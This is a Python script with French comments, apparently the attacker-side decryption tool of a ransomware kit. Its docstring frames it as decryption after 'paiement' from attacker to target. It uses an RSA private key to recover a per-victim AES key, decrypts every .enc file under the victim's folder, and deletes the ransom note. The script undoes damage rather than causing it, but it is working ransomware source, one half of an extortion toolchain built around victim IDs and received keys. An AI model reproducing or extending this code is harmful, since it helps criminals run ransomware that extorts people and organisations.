#!/usr/bin/env python3
"""
decrypt.py — Déchiffre les fichiers après "paiement" (ATTAQUANT → TARGET)
Usage: python3 decrypt.py <dossier> <victim_id> <private.pem> <received_keys/>

Exemple:
  python3 decrypt.py /home/victim A1B2C3D4 private.pem received_keys/A1B2C3D4.hex
"""

import sys
import os
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding

def load_private_key(path):
    with open(path, "rb") as f:
        return serialization.load_pem_private_key(f.read(), password=None)

def decrypt_aes_key(private_key, enc_key_hex):
    enc_key = bytes.fromhex(enc_key_hex.strip())
    return private_key.decrypt(
        enc_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        )
    )

def decrypt_file(enc_path, aes_key):
    with open(enc_path, "rb") as f:
        data = f.read()

    iv = data[:16]
    ciphertext = data[16:]

    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()

    unpadder = sym_padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(padded) + unpadder.finalize()

    original_path = enc_path[:-4]  # retire .enc
    with open(original_path, "wb") as f:
        f.write(plaintext)

    os.remove(enc_path)
    return original_path

def main():
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <dossier> <victim_id> <private.pem> <key.hex>")
        sys.exit(1)

    directory   = sys.argv[1]
    victim_id   = sys.argv[2]
    privkey_path = sys.argv[3]
    key_hex_path = sys.argv[4]

    print(f"[*] Chargement de la clé privée RSA...")
    private_key = load_private_key(privkey_path)

    print(f"[*] Déchiffrement de la clé AES (victim: {victim_id})...")
    with open(key_hex_path) as f:
        enc_key_hex = f.read()
    aes_key = decrypt_aes_key(private_key, enc_key_hex)
    print(f"[+] Clé AES récupérée")

    print(f"[*] Déchiffrement de {directory}...")
    count = 0
    for root, _, files in os.walk(directory):
        for fname in files:
            if not fname.endswith(".enc"):
                continue
            full_path = os.path.join(root, fname)
            try:
                original = decrypt_file(full_path, aes_key)
                print(f"  [+] {fname} → {os.path.basename(original)}")
                count += 1
            except Exception as e:
                print(f"  [!] Erreur sur {fname}: {e}")

    # Supprime la note de rançon
    note = os.path.join(directory, "README_DECRYPT.txt")
    if os.path.exists(note):
        os.remove(note)

    print(f"\n[+] {count} fichier(s) déchiffré(s) avec succès")

if __name__ == "__main__":
    main()
